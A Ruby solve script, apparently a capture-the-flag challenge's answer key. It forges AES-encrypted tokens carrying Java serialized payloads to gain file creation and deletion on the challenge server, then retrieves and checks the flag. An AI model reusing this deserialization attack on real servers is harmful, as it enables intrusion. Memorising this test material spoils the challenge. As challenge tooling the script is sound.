require 'httparty'
require 'openssl'
require 'base64'

require './libronsolve.rb'

KEY = "\xd0\x3f\x32\x62\xbf\xe4\xd7\x9c\xa3\xde\xe4\x97\xcf\xff\x16\xca\x7d\x8b\xd2\x7b\xb2\x88\xf5\x68\xdd\x9e\x3d\x41\xf5\xc9\x4f\xec"
IV = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"

def send_payload(payload)
  cipher = OpenSSL::Cipher.new('AES-256-CBC')
  cipher.encrypt
  cipher.iv = IV
  cipher.key = KEY

  token = Base64::urlsafe_encode64(cipher.update(payload) + cipher.final()) + "$2"

  out = HTTParty.get("#{ get_url() }validate?token=#{ token }")
  $stderr.puts out
  if out.body.empty?
    $stderr.puts "Couldn't connect!"
    exit 1
  end

  if out.code != 200
    $stderr.puts "Unexpected response (not HTTP/200)"
    $stderr.puts out
    exit 1
  end

  if out.parsed_response !~ /java.lang.reflect.InvocationTargetException/
    $stderr.puts "Response didn't contain the expected error"
    $stderr.puts out.parsed_response
  end
end

# Create the flag
send_payload(File.read('./createsecretfile.ser'))

# Grab it
flag = HTTParty.get("#{ get_url() }.uptime/supersecretuptimecheck.txt").parsed_response.chomp

# Delete it
send_payload(File.read('./deletesecretfile.ser'))

# Check the flag
check_flag(flag, terminate: true)
